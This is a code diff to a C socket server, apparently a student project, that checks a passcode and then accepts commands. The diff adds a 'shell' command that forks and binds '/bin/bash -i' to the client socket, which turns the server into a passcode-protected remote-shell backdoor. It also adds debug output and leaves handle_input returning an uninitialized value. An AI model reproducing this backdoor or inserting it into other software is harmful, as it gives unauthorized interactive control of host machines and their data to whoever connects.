@@ -57,37 +57,67 @@ typedef struct s_client {
 
 void handle_handshake(t_client *client, char *input)
 {
-	if (strcmp(PASSCODE, input) == 0)
+	printf("HANDSHAKE INPUT [%s]\n", input);
+	if (client->status == HANDSHAKE)
 	{
+		if (strcmp(PASSCODE, input) != 0) {
+			printf("Invalid KEY\n");
+			return ;
+		}
 		printf("Valid KEY\n");
 		client->status = CONNECTED;
-		return ;
 	}
-	printf("Invalid KEY\n");
-
+	send(client->fd, "$> ", 3, 0);
 }
 
-void handle_commands(t_client *client, char *input)
+int handle_commands(t_client *client, char *input)
 {
-	if (strcmp("?", input) == 0 || strcmp("help", input) == 0)
+	int status;
+
+	if (strcmp("clear", input) == 0)
 	{
-		send(client->fd, HELP, sizeof(HELP), 0);
+		send(client->fd, CLEAR_CODE, sizeof(CLEAR_CODE), 0);
 	}
 	else if (strcmp("shell", input) == 0)
 	{
 		send(client->fd, REMOTE_OPENED, sizeof(REMOTE_OPENED), 0);
+
+		pid_t pid = fork();
+		if (pid == 0)
+		{
+			char *args[] = {"/bin/bash", "-i", NULL};
+			dup2(client->fd, STDIN_FILENO);
+			dup2(client->fd, STDERR_FILENO);
+			dup2(client->fd, STDOUT_FILENO);
+			close(client->fd);
+			execv("/bin/bash", args);
+			exit(1);
+		}
+		waitpid(-1, &status, 0);
 	}
+	else if (strcmp("?", input) == 0 || strcmp("help", input) == 0)
+	{
+		send(client->fd, HELP, sizeof(HELP), 0);
+	}
+	else
+	{
+		send(client->fd, "$> ", 3, 0);
+	}
+	return (0);
 }
 
-void handle_input(t_client *client, char *buffer)
+int handle_input(t_client *client, char *buffer)
 {
-	char *input = ft_strtrim(buffer, TRIM_CHARS);
+	char	*input = ft_strtrim(buffer, TRIM_CHARS);
+	int		fd;
 
+	printf("readed: [%s]\n", input);
 	if (client->status == HANDSHAKE)
 		handle_handshake(client, input);
 	else if (client->status == CONNECTED)
-		handle_commands(client, input);
+		fd = handle_commands(client, input);
 	free(input);
+	return (fd);
 }
 
 void init_server()
@@ -159,7 +189,7 @@ void init_server()
 
 					char buffer[1024] = {0};
 
-					int ret_read = read(c_fd, buffer, sizeof(buffer));
+					int ret_read = read(c_fd, buffer, sizeof(buffer) - 1);
 					if (ret_read < 0)
 					{
 						perror("recv");
@@ -175,9 +205,6 @@ void init_server()
 					else
 					{
 						handle_input(&clients[fd], buffer);
-						buffer[ret_read] = '\0';
-						printf("readed: [%s]\n", buffer);
-						handle_handshake(&clients[fd], buffer);
 					}
 					if (clients[fd].status == HANDSHAKE)
 						send(c_fd, "Keycode: ", 10, 0);
